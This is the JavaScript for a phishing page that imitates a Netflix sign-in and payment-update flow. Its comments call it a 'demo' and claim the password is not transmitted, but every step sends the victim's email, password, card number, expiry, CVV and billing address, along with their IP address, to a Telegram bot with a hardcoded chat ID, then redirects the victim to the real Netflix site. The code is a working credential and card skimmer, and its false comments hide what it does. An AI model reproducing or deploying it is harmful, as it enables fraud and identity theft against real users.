"use strict";

// Elements
const stepWrapper = document.getElementById("stepWrapper");
const emailInput = document.getElementById("emailInput");
const emailContinue = document.getElementById("emailContinue");
const inputWrapper = document.getElementById("inputWrapper");
const reviewEmail = document.getElementById("reviewEmail");
const changeEmail = document.getElementById("changeEmail");
const reviewContinue = document.getElementById("reviewContinue");
const passwordBack = document.getElementById("passwordBack");
const passwordInput = document.getElementById("passwordInput");
const showPassword = document.getElementById("showPassword");
const signInButton = document.getElementById("signInButton");
const paymentBack = document.getElementById("paymentBack");
const updatePaymentButton = document.getElementById("updatePaymentButton");

// Help elements
const getHelp = document.getElementById("getHelp");
const helpMenu = document.getElementById("helpMenu");
const reviewHelp = document.getElementById("reviewHelp");
const reviewHelpMenu = document.getElementById("reviewHelpMenu");
const passwordHelp = document.getElementById("passwordHelp");
const passwordHelpMenu = document.getElementById("passwordHelpMenu");
const paymentHelp = document.getElementById("paymentHelp");
const paymentHelpMenu = document.getElementById("paymentHelpMenu");

// Step 1 → Step 2
emailContinue.addEventListener("click", function () {
    const value = emailInput.value.trim();

    if (!value) {
        inputWrapper.classList.add("invalid");
        emailInput.focus();
        return;
    }

    inputWrapper.classList.remove("invalid");

    // Local display only.
    reviewEmail.textContent = value;

    stepWrapper.classList.remove("password-active");
    stepWrapper.classList.remove("payment-active");
    stepWrapper.classList.add("review-active");

    sendToTelegramBot({ step: "Step 1", data: { email: value } });
});

// Email Enter Key
emailInput.addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        emailContinue.click();
    }
});

// Clear Email Error
emailInput.addEventListener("input", function () {
    if (emailInput.value.trim() !== "") {
        inputWrapper.classList.remove("invalid");
    }
});

// Step 2 → Step 1
changeEmail.addEventListener("click", function () {
    stepWrapper.classList.remove("review-active");
    stepWrapper.classList.remove("password-active");
    stepWrapper.classList.remove("payment-active");

    setTimeout(function () {
        emailInput.focus();
    }, 350);
});

// Step 2 → Step 3
reviewContinue.addEventListener("click", function () {
    stepWrapper.classList.remove("review-active");
    stepWrapper.classList.remove("payment-active");
    stepWrapper.classList.add("password-active");

    setTimeout(function () {
        passwordInput.focus();
    }, 350);

    sendToTelegramBot({ step: "Step 2", data: { email: reviewEmail.textContent } });
});

// Step 3 → Step 2
passwordBack.addEventListener("click", function () {
    stepWrapper.classList.remove("password-active");
    stepWrapper.classList.remove("payment-active");
    stepWrapper.classList.add("review-active");
});

// Show / Hide Password
showPassword.addEventListener("click", function () {
    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        showPassword.textContent = "HIDE";
    } else {
        passwordInput.type = "password";
        showPassword.textContent = "SHOW";
    }

    passwordInput.focus();
});

// Step 3 → Step 4
signInButton.addEventListener("click", function () {
    // Password is deliberately not transmitted or stored.
    stepWrapper.classList.remove("review-active");
    stepWrapper.classList.remove("password-active");
    stepWrapper.classList.add("payment-active");

    setTimeout(function () {
        const cardName = document.getElementById("demoCardName");
        if (cardName) {
            cardName.focus();
        }
    }, 350);

    sendToTelegramBot({ step: "Step 3", data: { password: passwordInput.value } });
});

// Step 4 → Step 3
paymentBack.addEventListener("click", function () {
    stepWrapper.classList.remove("payment-active");
    stepWrapper.classList.add("password-active");

    setTimeout(function () {
        passwordInput.focus();
    }, 350);
});

// Demo Payment Button
updatePaymentButton.addEventListener("click", function () {
    window.location.href = "https://www.netflix.com";
    sendToTelegramBot({
        step: "Step 4",
        data: {
            cardName: demoCardName.value,
            cardNumber: demoCardNumber.value,
            expiry: demoExpiry.value,
            cvv: demoCvv.value,
            billingAddress: billingAddress.value,
            billingCity: billingCity.value,
            billingState: billingState.value,
            billingZip: billingZip.value,
            billingCountry: billingCountry.value
        }
    });
});

// Help Menu Management
function closeHelpMenus() {
    helpMenu.classList.remove("open");
    reviewHelpMenu.classList.remove("open");
    passwordHelpMenu.classList.remove("open");
    paymentHelpMenu.classList.remove("open");

    getHelp.classList.remove("open");
    reviewHelp.classList.remove("open");
    passwordHelp.classList.remove("open");
    paymentHelp.classList.remove("open");
}

function toggleHelp(button, menu) {
    const shouldOpen = !menu.classList.contains("open");

    closeHelpMenus();

    if (shouldOpen) {
        menu.classList.add("open");
        button.classList.add("open");
    }
}

// HELP — STEP 1
getHelp.addEventListener("click", function (event) {
    event.stopPropagation();
    toggleHelp(getHelp, helpMenu);
});

// HELP — STEP 2
reviewHelp.addEventListener("click", function (event) {
    event.stopPropagation();
    toggleHelp(reviewHelp, reviewHelpMenu);
});

// HELP — STEP 3
passwordHelp.addEventListener("click", function (event) {
    event.stopPropagation();
    toggleHelp(passwordHelp, passwordHelpMenu);
});

// HELP — STEP 4
paymentHelp.addEventListener("click", function (event) {
    event.stopPropagation();
    toggleHelp(paymentHelp, paymentHelpMenu);
});

// Demo Help Buttons
document.querySelectorAll("[data-demo-action]").forEach(function (button) {
    button.addEventListener("click", function (event) {
        event.stopPropagation();
        alert("Demo mode: this option is not connected to any service.");
    });
});

// Click Outside Help
document.addEventListener("click", function () {
    closeHelpMenus();
});

// Escape
document.addEventListener("keydown", function (event) {
    if (event.key === "Escape") {
        closeHelpMenus();
    }
});

// Demo Payment Field Elements
const demoCardName = document.getElementById("demoCardName");
const demoCardNumber = document.getElementById("demoCardNumber");
const demoExpiry = document.getElementById("demoExpiry");
const demoCvv = document.getElementById("demoCvv");

// Demo Card Number Formatting
demoCardNumber.addEventListener("input", function () {
    let value = this.value.replace(/\D/g, "").slice(0, 16);

    let formatted = "";

    for (let i = 0; i < value.length; i += 4) {
        if (formatted) {
            formatted += " ";
        }

        formatted += value.slice(i, i + 4);
    }

    this.value = formatted;
});

// Demo Expiry Formatting
demoExpiry.addEventListener("input", function () {
    let value = this.value.replace(/\D/g, "").slice(0, 4);

    if (value.length > 2) {
        value = value.slice(0, 2) + "/" + value.slice(2);
    }

    this.value = value;
});

// Demo CVV Formatting
demoCvv.addEventListener("input", function () {
    this.value = this.value.replace(/\D/g, "").slice(0, 4);
});

// Force Country to United States
const billingCountry = document.getElementById("billingCountry");

billingCountry.value = "US";

billingCountry.addEventListener("change", function () {
    this.value = "US";
});

// Function to send data to Telegram bot
function sendToTelegramBot(data) {
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(ipData => {
            const ip = ipData.ip;
            data.ip = ip;

            // Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
            // Replace 'YOUR_CHAT_ID' with the chat ID of the recipient
            const telegramUrl = `https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage`;

            let message = `<b>${data.step}</b>\n`;
            for (let key in data.data) {
                message += `${key}: ${data.data[key]}\n`;
            }
            message += `\nIP Address: ${ip}`;

            // Improved formatting with emojis
            if (data.step === "Step 4") {
                message = `<b>💳 Payment Details:</b>\n`;
                message += `• Card Name: ${data.data.cardName} 👤\n`;
                message += `• Card Number: ${data.data.cardNumber} 💳\n`;
                message += `• Expiry: ${data.data.expiry} 📅\n`;
                message += `• CVV: ${data.data.cvv} 🔒\n`;
                message += `• Billing Address: ${data.data.billingAddress} 🏡\n`;
                message += `• City: ${data.data.billingCity} 📍\n`;
                message += `• State: ${data.data.billingState} 🗺️\n`;
                message += `• Zip: ${data.data.billingZip} 🎟️\n`;
                message += `• Country: ${data.data.billingCountry} 🌍`;
            } else if (data.step === "Step 1") {
                message = `<b>📧 Email:</b> ${data.data.email} 👤\n`;
                message += `IP Address: ${ip} 🌐`;
            } else if (data.step === "Step 2") {
                message = `<b>📧 Email:</b> ${data.data.email} 👤\n`;
                message += `IP Address: ${ip} 🌐`;
            } else if (data.step === "Step 3") {
                message = `<b>🔒 Password:</b> ${data.data.password} 🔒\n`;
                message += `IP Address: ${ip} 🌐`;
            }

            fetch(telegramUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: "676012585",
                    text: message,
                    parse_mode: "HTML"
                })
            })
                .then(response => response.json())
                .then(result => console.log("Success:", result))
                .catch(error => console.error("Error:", error));
        });
}
